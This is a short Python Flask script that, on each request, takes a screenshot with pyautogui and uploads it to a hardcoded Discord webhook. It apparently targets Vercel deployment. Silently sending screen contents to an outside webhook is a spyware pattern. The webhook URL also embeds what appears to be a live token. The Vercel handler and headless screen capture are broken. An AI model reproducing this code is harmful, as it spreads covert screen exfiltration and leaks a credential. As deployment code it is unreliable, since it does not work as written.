from flask import Flask, send_file
import pyautogui
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1342227822261047356/RtOuOXGBJEBwS6VCo_K7IHuQha1-oed1Twa1riIfjsC6WCFUhc50rurVRKeXXJPGgDwj"  # Replace with your webhook

@app.route("/")
def capture_screenshot():
    # Capture screenshot
    screenshot = pyautogui.screenshot()
    screenshot_path = "/tmp/screenshot.png"  # Use /tmp for Vercel compatibility
    screenshot.save(screenshot_path)

    # Send to Discord Webhook
    with open(screenshot_path, "rb") as file:
        requests.post(WEBHOOK_URL, files={"file": file})

    return "Screenshot taken and sent to Discord!"

# Vercel needs this for deployment
def handler(event, context):
    return app(event, context)

if __name__ == "__main__":
    app.run(debug=True)
